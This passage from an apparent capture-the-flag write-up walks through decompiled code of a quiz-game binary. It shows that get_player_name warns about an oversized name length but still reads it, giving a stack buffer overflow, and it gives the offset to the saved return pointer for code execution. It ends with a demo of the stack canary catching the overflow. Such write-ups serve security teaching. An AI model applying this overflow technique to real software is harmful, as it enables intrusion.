</span></span><span class="line"><span class="cl">    <span class="n">cVar4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">uVar2</span> <span class="o">%</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">print</span><span class="p">(</span><span class="s">&#34;How much is &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">u64toa</span><span class="p">(</span><span class="n">local_58</span><span class="p">,</span><span class="n">cVar3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">print</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">print</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0010099f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">u64toa</span><span class="p">(</span><span class="n">local_58</span><span class="p">,</span><span class="n">cVar4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">print</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34; ?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">cVar1</span> <span class="o">=</span> <span class="n">readline</span><span class="p">(</span><span class="n">local_38</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">cVar1</span> <span class="o">!=</span> <span class="sc">&#39;\x01&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_00100746</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">        <span class="n">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">cVar1</span> <span class="o">=</span> <span class="n">atou64</span><span class="p">(</span><span class="n">local_38</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="kt">char</span><span class="p">)(</span><span class="n">cVar4</span> <span class="o">+</span> <span class="n">cVar3</span><span class="p">)</span> <span class="o">!=</span> <span class="n">cVar1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Wrong! Game Over!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">check_scoreboard</span><span class="p">(</span><span class="n">local_68</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">LAB_00100746</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_68</span> <span class="o">=</span> <span class="n">local_68</span> <span class="o">+</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">print</span><span class="p">(</span><span class="s">&#34;Yes! +5pts! You have &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">u64toa</span><span class="p">(</span><span class="n">local_58</span><span class="p">,</span><span class="n">local_68</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">print</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;pts total.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_60</span> <span class="o">=</span> <span class="n">local_60</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading through the source code, we can see that it will initialize a loop to give us questions. If we gave the correct answer to the question, it will stay in the loop. It also has a variable to store the points that we get from answering the questions (which is 5 pts per correct answer). If we gave the wrong answer, it will break the loop and call <code>check_scoreboard</code> with the parameter of our total score. Let&rsquo;s check what the method does.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">check_scoreboard</span><span class="p">(</span><span class="n">ulong</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">curr_pos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">curr_pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mi">9</span> <span class="o">&lt;</span> <span class="n">curr_pos</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_0010055c</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">        <span class="n">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="n">ulong</span><span class="p">)</span><span class="n">game_scoreboard</span><span class="p">[</span><span class="n">curr_pos</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">param_1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">shift_scoreboard</span><span class="p">(</span><span class="n">curr_pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">get_player_name</span><span class="p">(</span><span class="n">curr_pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">game_scoreboard</span><span class="p">[</span><span class="n">curr_pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">goto</span> <span class="n">LAB_0010055c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">curr_pos</span> <span class="o">=</span> <span class="n">curr_pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading through the source code, we can see that in this method, if our score is higher than one of the values stored in the <code>game_scoreboard</code>, this method will call <code>shift_scoreboard</code> and <code>get_playername</code>. Let&rsquo;s try to decompile each of them to understand better.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">shift_scoreboard</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">curr_pos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">curr_pos</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;</span> <span class="n">param_1</span> <span class="o">&lt;</span> <span class="n">curr_pos</span><span class="p">;</span> <span class="n">curr_pos</span> <span class="o">=</span> <span class="n">curr_pos</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">game_scoreboard</span><span class="p">[</span><span class="n">curr_pos</span><span class="p">]</span> <span class="o">=</span> <span class="n">game_scoreboard</span><span class="p">[(</span><span class="kt">long</span><span class="p">)</span><span class="n">curr_pos</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="n">game_names</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">curr_pos</span> <span class="o">*</span> <span class="mh">0x20</span><span class="p">,</span><span class="n">game_names</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">curr_pos</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="n">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This method doesn&rsquo;t have anything suspicious LOC, it just shifts the array to put our score to the scoreboard array.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_player_name</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">cVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ulong</span> <span class="n">__nbytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="n">local_48</span> <span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">local_38</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ulong</span> <span class="n">local_20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_38</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_28</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Congratulations! You</span><span class="se">\&#39;</span><span class="s">re going to the SCOREBOARD!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;How long is your name (0-31)?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">cVar1</span> <span class="o">=</span> <span class="n">readline</span><span class="p">(</span><span class="n">local_48</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">cVar1</span> <span class="o">==</span> <span class="sc">&#39;\x01&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">__nbytes</span> <span class="o">=</span> <span class="n">atou64</span><span class="p">(</span><span class="n">local_48</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mh">0x1f</span> <span class="o">&lt;</span> <span class="n">__nbytes</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Name too long! No SCOREBOARD for you.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Now type in your name:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">,</span><span class="n">__nbytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_20</span> <span class="o">=</span> <span class="n">local_20</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="n">game_names</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">param_1</span> <span class="o">*</span> <span class="mh">0x20</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="n">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This method will be used to store our name in the scoreboard, where we will need to send our name as the input, and the scoreboard will be updated. There is something wrong with this method. Let&rsquo;s see the <code>get_player_name</code> method, especially on the below LOC.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Congratulations! You</span><span class="se">\&#39;</span><span class="s">re going to the SCOREBOARD!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;How long is your name (0-31)?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">cVar1</span> <span class="o">=</span> <span class="n">readline</span><span class="p">(</span><span class="n">local_48</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">cVar1</span> <span class="o">==</span> <span class="sc">&#39;\x01&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">__nbytes</span> <span class="o">=</span> <span class="n">atou64</span><span class="p">(</span><span class="n">local_48</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="mh">0x1f</span> <span class="o">&lt;</span> <span class="n">__nbytes</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Name too long! No SCOREBOARD for you.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Now type in your name:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">,</span><span class="n">__nbytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_20</span> <span class="o">=</span> <span class="n">local_20</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="n">game_names</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">param_1</span> <span class="o">*</span> <span class="mh">0x20</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The first thing to notice is that these LOCs will:</p>
<ul>
<li>Ask you the size of your name</li>
<li>Check whether the size is &lt;= <code>0x1f</code></li>
<li>Read your name and put it in the local variable in the stack called <code>local_38`` (placed in </code>rbp-0x30`)</li>
</ul>
<p>But, notice that there is a <strong>buffer overflow bug</strong> in these LOCs. In case you haven&rsquo;t known yet, <a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener noreffer ">Buffer overflow</a> is a type of security bug where due to an incorrect bound check, the attackers can write more data than it is supposed to be so that they can overwrite adjacent values that aren&rsquo;t supposed to be able to be overwritten. For example:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Let say we have a stack like below, and we have 2 local variables &#34;x&#34; and &#34;y&#34;,
</span></span><span class="line"><span class="cl">where the size of the &#34;x&#34; variable supposed to be 0x10 only
</span></span><span class="line"><span class="cl">Lower Address
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">| ........                         | &lt;- x variable location in stack
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| ........                         |
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| other values                     | &lt;- y variable location in stack
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">Higher Address
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Due to buffer overflow bug during reading &#34;x&#34; value, we are allowed to write let say input with size 0x18.
</span></span><span class="line"><span class="cl">Now, due to this bug, &#34;y&#34; variable is got overwritten even though it shouldn&#39;t be overwritten. Below is the
</span></span><span class="line"><span class="cl">stack condition after we send &#34;a&#34;*0x18 as the input
</span></span><span class="line"><span class="cl">Lower Address
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">| aaaaaaaa                         | &lt;- x variable location in stack
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| aaaaaaaa                         |
</span></span><span class="line"><span class="cl">|----------------------------------|
</span></span><span class="line"><span class="cl">| aaaaaaaa                         | &lt;- y variable location in stack and got overwritten
</span></span><span class="line"><span class="cl"> ----------------------------------
</span></span><span class="line"><span class="cl">Higher Address
</span></span></code></pre></td></tr></table>
</div>
</div><p>Back to the LOCs, notice that there is actually a bound check to make sure that the inputted size by the user is less than or equal to <code>0x1f</code>, so that user isn&rsquo;t able to write data larger than the defined size.</p>
<p>However, after they print the warning message, the if block logic doesn&rsquo;t return or stop the method, instead it will goes outside the if block and still continue reading the input, which makes buffer overflow is still possible. This improper bound checking leads to the buffer overflow bug, where we can simply set a large size, and then we can overwrite not only the name variable but also the other values whose address is higher than the name variable.</p>
<p>Now, if we are able to use this buffer overflow bug, we can modify the program flow and get our RCE. Usually, if we have a buffer overflow bug in the stack, our common target is to overwrite the saved return pointer at the bottom of the stack (<code>rbp+8</code>). If you still don&rsquo;t know how to use BOF to perform RCE, it&rsquo;s okay. I will try to explain the detail on this later during crafting our exploitation plan.</p>
<p>By overwriting the saved return pointer, we will have full control of the execution flow of the vulnerable binary. In this case, our name variable is placed in <code>rbp-0x30</code>, so to overwrite the return pointer, we will need to set the input size to at least <code>0x38</code>.</p>
<p>However, looking through the code, this binary has already done mitigation from buffer overflow bug by having a <code>canary</code> to prevent stack smashing. Below LOCs is the conditional logic to check the <code>canary</code> value:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="n">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In case you didn&rsquo;t know what that is, <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener noreffer ">canary</a> is a secret value that is placed near the stack return pointer (<code>rbp-8</code>). The purpose of this is to detect whether buffer overflow is performed or not. How to detect it? Well during sending our buffer overflow payload to overwrite the stack return pointer, because <code>canary</code> is placed before the return pointer, that means if we try to overwrite the return pointer of the stack, by default the <code>canary</code> will be overwritten also. And then before jumping to the new return pointer, the binary will check whether the <code>canary</code> in the stack is correct or not (compared to the stored value in <code>fs</code> register), and then return <code>Stack smashing detected</code> if this value is changed from the stack. Below is the example demonstration:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Round 12
</span></span><span class="line"><span class="cl">How much is 1 + 2 ?
</span></span><span class="line"><span class="cl">0
</span></span><span class="line"><span class="cl">Wrong! Game Over!
</span></span><span class="line"><span class="cl">Congratulations! You&#39;re going to the SCOREBOARD!
</span></span><span class="line"><span class="cl">How long is your name (0-31)?
</span></span><span class="line"><span class="cl">60
</span></span><span class="line"><span class="cl">Name too long! No SCOREBOARD for you.
</span></span><span class="line"><span class="cl">Now type in your name:
</span></span><span class="line"><span class="cl">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span></span><span class="line"><span class="cl">Stack smashing detected - mischief not managed!
</span></span></code></pre></td></tr></table>
</div>
